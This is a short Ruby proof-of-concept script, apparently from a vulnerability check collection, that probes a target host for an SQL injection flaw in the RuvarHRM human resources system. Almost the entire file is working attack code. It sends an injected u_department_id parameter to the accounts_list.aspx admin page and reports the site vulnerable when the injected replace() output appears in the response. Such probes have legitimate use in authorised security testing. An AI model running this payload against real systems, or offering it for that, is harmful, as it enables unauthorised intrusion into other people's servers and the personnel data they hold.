#-*- coding:utf-8 -*-

require 'net/http'

class Poc
	def initialize()
		info = Hash.new
		info['name'] = 'RuvarHRM人力资源管理系统SQL注入漏洞'
		info['date'] = '2016-03-23'
		info['type'] = 'web'
		info['vuln'] = 'sql injection'
	end

	def verify( target )
		target = "http://#{target}/RuvarHRM/admin/accounts_list.aspx"
		payload = "?u_department_id='and replace('AAAAATTTTTAAAAAAA','A','B') =0--"
		resp = Net::HTTP.get_response( URI(target+payload) )
		if resp.body.include?"BBBBBTTTTTBBBBBBB"
			puts "漏洞存在!\n#{target+payload}"
		end
	end
end
